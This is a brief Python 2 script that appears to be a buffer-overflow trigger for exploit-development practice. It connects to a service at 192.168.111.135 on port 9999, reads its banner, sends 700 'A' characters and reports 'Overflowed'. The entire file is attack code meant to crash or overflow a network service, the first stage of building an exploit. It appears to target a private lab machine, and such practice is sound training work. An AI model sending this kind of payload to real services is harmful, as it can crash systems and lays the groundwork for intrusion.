#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
	buffer = 'A'*700
	print "\nSending payload ..... \n"
	s.connect(('192.168.111.135',9999))
	s.recv(1024)
	s.send(buffer  + '\r\n')
	print "\n Overflowed"

except:
	print "Could not  connect"
